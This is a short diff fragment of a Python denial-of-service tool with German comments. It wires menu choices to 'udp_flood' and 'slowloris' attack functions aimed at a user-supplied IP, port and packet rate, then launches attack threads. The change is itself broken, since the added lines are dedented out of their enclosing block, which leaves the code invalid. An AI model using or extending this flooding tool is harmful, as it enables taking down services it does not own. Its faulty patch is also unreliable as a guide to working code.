@@ -108,14 +108,14 @@ if __name__ == "__main__":
             packet_rate = int(input("Maximale Pakete pro Sekunde (z. B. 50000): "))
             stop_event.clear()
 
-            # Angriffsfunktionen den Optionen zuordnen
-            if choice == "1":
-                attack_function = udp_flood
-                                args = (ip, port, 10000)  # UDP-Flood mit 10000 Bytes
-            elif choice == "2":
-                attack_function = slowloris
-                args = (ip, 80)  # Standard-Port für HTTP
-
+# Angriffsfunktionen den Optionen zuordnen
+if choice == "1":
+    attack_function = udp_flood
+    args = (ip, port, 10000)  # UDP-Flood mit 10000 Bytes
+elif choice == "2":
+    attack_function = slowloris
+    args = (ip, port)  # Standard-Port für Slowloris
+    
             # Threads starten
             attack_threads = [
                 threading.Thread(target=attack_function, args=args)
